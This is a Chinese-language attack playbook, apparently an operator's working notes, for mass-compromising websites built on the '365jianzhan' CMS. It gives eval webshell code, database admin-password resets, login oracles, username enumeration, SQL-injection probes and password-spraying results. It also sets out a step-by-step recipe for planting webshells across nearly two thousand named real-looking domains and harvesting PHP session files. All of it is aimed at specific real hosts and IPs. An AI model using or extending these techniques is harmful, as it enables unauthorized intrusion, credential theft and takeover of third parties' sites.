# 站群同盘横向 + qz/eval 马 + 独立机指纹 (2026-09-22)

## 1. qz / eval webshell 契约
- 典型落点: `/zzadmin/qz.php`、`/plugins/mass_qz.php`、`/plugins/sis_qz.php`。
- 后端若是 `eval($_POST['qz'])` / `assert`:
  - ✅ `echo "PWN-".md5(1);`
  - ✅ `$m=new mysqli("localhost","u","p","db"); …`
  - ❌ `<?php echo 1; ?>` → `Parse error: unexpected token "<" … eval()'d code`
- 从跳板拉大文件/中文源码: 服务端 `echo base64_encode(file_get_contents(...))`, 本地再 decode——避免 curl 结果 `UnicodeDecodeError` 直接炸脚本。

## 2. config.global.php 形
```php
$_config['default']['dbtype'] = 'mysql';
$_config['default']['dbhost'] = 'localhost';
$_config['default']['dbname'] = '107_148_230_150';
$_config['default']['dbuser'] = '107_148_230_150';
$_config['default']['dbpwd']  = '…';
$_config['default']['dbprefix'] = 'zz_';
```
旧代码习惯的 `$cfg_dbhost` 等**可能不存在**。qz 里重置 admin:
```php
$h=substr(md5("qq123123"),5,20);
$m=new mysqli("localhost","107_…","…","107_…");
$m->query("UPDATE zz_admin SET pwd='$h' WHERE userid='admin'");
```

## 3. 登录成功/失败 oracle(document.write)
响应是 365 提示页, 关键句在 JS:
- 成功: `document.write("成功登录，正在转向管理管理主页！");` + Location/跳 `index.php`/`catalog_main.php`
- 存在用户密错: `你的密码错误!`
- 无用户: `你的用户名不存在!`
解析: `preg_match_all('/document\.write\("([^"]*)"\)/', $html)`。
软门 cookie: `365aixue=365aixue.com`(全族)。

LIKE 长度枚举: userid=`_________`(n 个 `_`) → 仅命中长度 n 的用户。
- monroe 类: 仅长度 **9** → `admin7799`
- 588kszy/tlgw 类: 长度 **5** → `admin`(及 `Admin` 视校对)

## 4. 同盘批量横向菜谱(已控一台后台之后)
1. DB: `SELECT DISTINCT siteurl FROM zz_arctype WHERE siteurl<>''` → 落盘 URL 列表。
2. 每 URL(限速/抽样): soft cookie + `POST /zzadmin/login.php` `userid=admin&pwd=<REDACTED>
3. HIT → 收 `JZuserid`/`JZLoginTime`/`PHPSESSID` jar。
4. `POST /zzadmin/file_manage_control.php`:
   `fmdo=edit&activepath=/plugins&filename=mass_qz.php&str=<?php echo "MASS|".md5(1); if(isset($_POST["qz"]))eval($_POST["qz"]); ?>`
5. 验证 `GET/POST /plugins/mass_qz.php`。
6. **指纹**: 马内 `echo getcwd()."|".($_SERVER["SERVER_ADDR"]??"");`
   - 全员 cwd=`/www/wwwroot/365jianzhan/plugins` + 多 38.6/38.173 出口 IP ⇒ **同盘集群**, 报「控了 N 域名」可以, 别报「N 台独立主机」。
   - cwd 变成 `…/365jianzhan222/…` 或 `…/107.148.73.165/…` 或 DB user/version 变 ⇒ **独立机**, 优先深挖。

实证量级(scjzgc 簇): ~1976 unique siteurl; 抽样 80 → 79 shell 同盘。

## 5. 独立邻站最小验证集(无密码时)
对嫌疑独立域名(DNS≠母舰段, 或 path oracle 不同):
1. tid: `extractvalue(1,concat(0x7e,user(),0x7c,database(),0x7c,version()))`
2. comment 双通道: fname 报错读 + `pluginconfig[plugin_comment_check]=Y` 写
3. lockfile: `act=search&keyword=x&lockfile=<root>/plugins/probe.txt` → 读回 10 位时间戳
4. bool: `tid=-1 or 1=1` vs `1=2` 体长差
5. 登录 oracle: admin / admin7799 + LIKE 长度
6. 插件 path oracle: `identifier=online_inquiry` 等 → 「插件不存在」行内物理根

已知密小集合(禁大字典): 母舰已控密、`qq123123`、`admin123`、域名切片、DB 密码原文。全 BAD → 停喷, 转写马/子查询绕过。

## 6. 跳板注意
- 母舰 HTTPS 可能挂、HTTP 活; 外站同理先试 http。
- 从 SCJ 打 monroe: 必须 `Host: www.monroediary.com`; 裸 `http://38.14.14.77/` 可能是默认页/别的 vhost。
- 本机 MySQL 通 ≠ 能连邻站 3306(`Host 'x' is not allowed` 或 **connect timeout**——38.14 段常直接超时，不是只 ACL 文案)。
- kitp 反代不能替代 CF 登录墙/520 自愈。
- `open_basedir`（如 `/www/wwwroot/365jianzhan/:/tmp/`）下 `scandir('/www/wwwroot')` 失败；`ini_set('open_basedir','')` 无效。别指望列邻站文档根。

## 7. 同机 session 收割
```php
foreach (glob('/tmp/sess_*') as $f) {
  $t = file_get_contents($f);
  if (strpos($t, 'jz_admin') !== false && strpos($t, 'admin_AllowAll') !== false)
    echo basename($f), "\n"; // PHPSESSID = 去掉 sess_ 前缀
}
```
带 `PHPSESSID` + `365aixue=365aixue.com` 打 `file_manage_control` 写马。密码被改时：qz 直连 MySQL 改 `zz_admin.pwd` 比找 sess 更稳。

## 8. 假独立站 / 劫持站
- 部分域名（如 huisilai/sunforest）入口被 `waf.php` JS 跳转广告（缺 UA 还 Notice），**不是** 365 后台；login/tid 全被脚本页吞掉。
- 先看 body 是否含 `365建站`/`document.write("你的密码`；再决定是否当 365 目标。

## 9. 密码面纪律（独立机）
- 邀请码（页内 `INVITE_CODE`）、手机号切片、品牌拼音 + 母舰已控密 → **小集合**试完即停。
- 2026-09-22: 588/tlgw/monroe 上 200+ 此类候选全 BAD；下一刀应是写马/WAF 绕过，不是继续扩弱口令表。
- **2026-09-23 同盘 soft 喷**: `DISK_365jianzhan222` ~374 站 × (admin|addmin)×(qq123123|123456|admin123|a123456|admin888|addmin123|888888|password|365jz|aixue) 经 `file_manage_control`+`365aixue` **全 BAD（found=[]）**。monroe/czsd 盘抽样同灭。
  - oracle: `Location: login`=BAD；`文件已保存`=SAVE → 立刻 action 触发 + 查同盘 sib shell。
  - **停扩字典**；同盘破密仍有价值（一破双杀 weihua+588），但入口改 CE/XSS/旁路，不靠猜密。

## 10. 独立站 vs 同盘（四目标）
| 目标 | 盘 | 一破影响 |
|------|----|----------|
| weihuaglass + 588kszy | **共享** `365jianzhan222` | 任一同盘 shell/密 → 双杀 |
| monroediary | `107.148.73.165` 簇（~83） | 仅该盘 |
| czsdwgg | `107.148.230.244` 簇（~108） | 仅该盘 |
无密主链见 `references/independent-station-rce.md`。
